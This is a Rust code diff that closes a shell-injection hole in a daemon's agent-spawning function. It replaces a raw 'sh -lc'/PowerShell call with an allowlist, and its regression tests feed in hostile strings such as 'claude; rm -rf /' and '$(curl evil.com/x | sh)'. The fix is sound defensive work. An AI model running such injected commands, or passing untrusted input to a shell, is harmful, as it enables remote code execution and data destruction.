@@ -8,21 +8,27 @@ use uuid::Uuid;
 
 use crate::daemon::state::DaemonState;
 
-fn agent_shell_command(agent_name: &str) -> (String, Vec<String>) {
-    #[cfg(target_family = "windows")]
-    {
-        (
-            "powershell".to_string(),
-            vec!["-Command".to_string(), agent_name.to_string()],
-        )
-    }
-
-    #[cfg(not(target_family = "windows"))]
-    {
-        (
-            "sh".to_string(),
-            vec!["-lc".to_string(), agent_name.to_string()],
-        )
+/// Resolves an agent identity to its `(program, args)` invocation — never a
+/// shell. Mirrors `agent_runner::canonical_agent_identity`'s accepted input
+/// forms so both handoff-delivery paths (the WS `Handover` command that
+/// calls `spawn_agent` below, and `raios run`/`raios task` in
+/// `agent_runner.rs`) treat the same identity string the same way.
+///
+/// Returns `None` for anything unrecognized instead of falling through to a
+/// shell: the previous implementation ran `sh -lc <agent_name>` (Unix) /
+/// `powershell -Command <agent_name>` (Windows) with `agent_name` taken
+/// verbatim from the WS client's `target` field (`daemon/handlers.rs`'s
+/// `"Handover"` command) — an unauthenticated-content shell injection, only
+/// not live-exploitable today because `Handover` happens to default to
+/// `action = "confirm"` in `raios-policy.toml` (see `security/umai.rs`),
+/// which is a policy setting, not a code guarantee.
+fn agent_command(agent_name: &str) -> Option<(&'static str, Vec<String>)> {
+    match agent_name.trim().to_lowercase().as_str() {
+        "claude" | "claude_kaira" => Some(("claude", vec![])),
+        "codex" | "codex_kaira" => Some(("codex", vec![])),
+        "opencode" | "opencode_kaira" => Some(("opencode", vec![])),
+        "antigravity" | "agy" | "antigravity_kaira" => Some(("agy", vec![])),
+        _ => None,
     }
 }
 
@@ -59,12 +65,21 @@ impl ExecutionProxy {
     }
 
     /// Spawns an agent in an isolated environment with a Death Timer.
+    ///
+    /// `agent_name` must resolve via `agent_command` to one of the four
+    /// canonical agent identities — anything else is refused before any
+    /// process state is touched. No ambient authority: an unrecognized
+    /// identity is not a "best effort" shell invocation, it's an error.
     pub async fn spawn_agent(
         &self,
         agent_name: &str,
         project_path: &str,
         timeout_secs: u64,
     ) -> Result<String> {
+        let (program, program_args) = agent_command(agent_name).ok_or_else(|| {
+            anyhow::anyhow!("Unknown agent identity '{}' — refusing to spawn", agent_name)
+        })?;
+
         let process_id = Uuid::new_v4();
 
         // Register the process in state
@@ -103,9 +118,8 @@ impl ExecutionProxy {
             use std::process::Stdio;
             use tokio::io::{AsyncBufReadExt, BufReader};
 
-            let (program, args) = agent_shell_command(&agent_name_cloned);
-            let mut cmd = Command::new(&program);
-            cmd.args(&args);
+            let mut cmd = Command::new(program);
+            cmd.args(&program_args);
             cmd.current_dir(&path_cloned);
             cmd.stdout(Stdio::piped());
             cmd.stderr(Stdio::piped());
@@ -193,21 +207,54 @@ impl ExecutionProxy {
 
 #[cfg(test)]
 mod tests {
-    use super::agent_shell_command;
+    use super::agent_command;
 
-    #[cfg(target_family = "windows")]
     #[test]
-    fn agent_shell_command_uses_powershell_on_windows() {
-        let (program, args) = agent_shell_command("claude");
-        assert_eq!(program, "powershell");
-        assert_eq!(args, vec!["-Command", "claude"]);
+    fn agent_command_resolves_all_canonical_identities() {
+        assert_eq!(agent_command("claude"), Some(("claude", vec![])));
+        assert_eq!(agent_command("claude_kaira"), Some(("claude", vec![])));
+        assert_eq!(agent_command("codex"), Some(("codex", vec![])));
+        assert_eq!(agent_command("codex_kaira"), Some(("codex", vec![])));
+        assert_eq!(agent_command("opencode"), Some(("opencode", vec![])));
+        assert_eq!(agent_command("opencode_kaira"), Some(("opencode", vec![])));
+        assert_eq!(agent_command("antigravity"), Some(("agy", vec![])));
+        assert_eq!(agent_command("agy"), Some(("agy", vec![])));
+        assert_eq!(agent_command("antigravity_kaira"), Some(("agy", vec![])));
     }
 
-    #[cfg(not(target_family = "windows"))]
     #[test]
-    fn agent_shell_command_uses_sh_on_unix() {
-        let (program, args) = agent_shell_command("claude");
-        assert_eq!(program, "sh");
-        assert_eq!(args, vec!["-lc", "claude"]);
+    fn agent_command_is_case_and_whitespace_insensitive() {
+        assert_eq!(agent_command("  Claude  "), Some(("claude", vec![])));
+        assert_eq!(agent_command("CODEX"), Some(("codex", vec![])));
+    }
+
+    /// Regression test for the shell-injection bug this module used to have:
+    /// `agent_name` is client-supplied (WS `Handover` command's `target`
+    /// field) and used to be handed straight to `sh -lc`/`powershell
+    /// -Command`. Anything that isn't a known agent identity — including a
+    /// deliberately shell-metacharacter-laden string — must be refused, not
+    /// passed to a shell "best effort".
+    #[test]
+    fn agent_command_rejects_unknown_or_injection_looking_input() {
+        assert_eq!(agent_command("claude; rm -rf /"), None);
+        assert_eq!(agent_command("$(curl evil.com/x | sh)"), None);
+        assert_eq!(agent_command(""), None);
+        assert_eq!(agent_command("gemini"), None); // removed CLI, see 2026-06-22 changelog
+    }
+
+    #[tokio::test]
+    async fn spawn_agent_rejects_unknown_identity_before_touching_state() {
+        use super::{DaemonState, ExecutionProxy};
+        use std::sync::Arc;
+        use tokio::sync::RwLock;
+
+        let state = Arc::new(RwLock::new(DaemonState::default()));
+        let proxy = ExecutionProxy::new(state.clone());
+
+        let result = proxy
+            .spawn_agent("claude; touch /tmp/pwned", "/tmp", 5)
+            .await;
+        assert!(result.is_err());
+        assert!(state.read().await.active_agents.is_empty());
     }
 }
